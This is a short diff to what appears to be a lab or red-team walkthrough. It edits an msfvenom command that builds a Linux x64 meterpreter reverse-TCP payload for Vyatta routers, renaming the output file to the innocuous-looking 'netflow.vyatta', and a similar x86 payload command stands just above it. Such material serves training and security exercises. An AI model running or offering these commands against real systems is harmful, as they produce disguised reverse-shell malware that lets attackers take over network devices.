@@ -529,10 +529,10 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=9729 
 ```
 
 Next, make the payload file for the vyatta routers:
-In the same directory on your Attack box, run the following command. The payload will be saved to a file called vyos_confd
+In the same directory on your Attack box, run the following command. The payload will be saved to a file called netflow.vyatta
 
 ```bash
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf >vyos_confd
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf > netflow.vyatta
 ```
 
 Use Admin Shares:
